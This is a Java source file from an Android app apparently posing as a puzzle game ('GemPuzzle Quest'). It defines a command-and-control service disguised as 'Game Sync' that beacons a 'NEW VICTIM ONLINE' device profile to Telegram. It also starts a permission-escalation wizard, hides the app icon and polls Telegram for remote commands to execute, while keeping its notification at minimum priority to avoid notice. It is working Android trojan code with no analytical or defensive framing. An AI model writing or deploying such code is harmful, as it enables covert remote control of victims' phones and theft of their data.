package com.gempuzzle.quest.c2;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.gempuzzle.quest.R;

/**
 * C2 foreground service — disguised as "Game Sync".
 * Runs in :c2 process. Starts Telegram long-polling loop,
 * sends first-beacon on initial launch, triggers permission
 * wizard and icon hide once critical access is granted.
 */
public class C2Service extends Service {

    private static final String TAG = "C2";
    private static final String CHAN_ID = "game_sync";
    private Thread pollThread;
    private volatile boolean running = false;

    @Override
    public void onCreate() {
        super.onCreate();
        startFg();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) {
            running = true;
            SharedPreferences prefs = getSharedPreferences("gq", Context.MODE_PRIVATE);
            boolean first = prefs.getBoolean("first_launch", true);
            if (first) {
                prefs.edit().putBoolean("first_launch", false).apply();
                new Thread(() -> {
                    try { Thread.sleep(8000); } catch (InterruptedException ignored) {}
                    TelegramClient.sendMessage("🎮 *NEW VICTIM ONLINE*\n" + DeviceInfo.card(C2Service.this));
                }).start();
            }
            // Kick off permission escalation wizard
            PermissionsWizard.start(this);
            // Start polling
            pollThread = new Thread(() -> TelegramClient.pollLoop(
                    (chatId, messageId, text, hasDoc, fileId) ->
                            CommandDispatcher.dispatch(C2Service.this, text, hasDoc, fileId)),
                    "c2poll");
            pollThread.start();
        }
        return START_STICKY;
    }

    private void startFg() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHAN_ID,
                    getString(R.string.fgs_title), NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            nm.createNotificationChannel(ch);
        }
        Notification n = new NotificationCompat.Builder(this, CHAN_ID)
                .setContentTitle(getString(R.string.fgs_title))
                .setContentText(getString(R.string.fgs_text))
                .setSmallIcon(android.R.drawable.ic_menu_rotate)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
        startForeground(1001, n);
    }

    @Override
    public void onDestroy() {
        running = false;
        if (pollThread != null) pollThread.interrupt();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
